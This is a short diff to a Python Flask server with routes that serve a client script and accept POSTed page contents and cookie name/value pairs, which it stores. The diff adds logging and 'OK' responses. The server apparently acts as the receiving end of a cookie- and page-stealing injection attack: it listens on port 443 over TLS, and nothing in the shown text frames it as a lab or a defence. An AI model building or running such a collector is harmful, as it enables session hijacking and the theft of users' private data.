@@ -17,11 +17,14 @@ def clientjs():
 
 @app.route ('/save_page', methods=['POST'])
 def save_page():
+	# print(request.form.keys())
 	if 'url' not in request.form.keys() or 'content' not in request.form.keys():
 		return "Invalid save page request", 400
 	url = request.form['url']
 	content = request.form['content']
+	print(f"[+] Inserting content with url {url}")
 	html_pages.insert_content((url, content))
+	return "OK"
 
 @app.route ('/save_cookie', methods=['POST'])
 def save_cookie():
@@ -30,5 +33,6 @@ def save_cookie():
 	name = request.form['name']
 	value = request.form['value']
 	html_pages.insert_content((name, value))
+	return "OK"
 
 app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
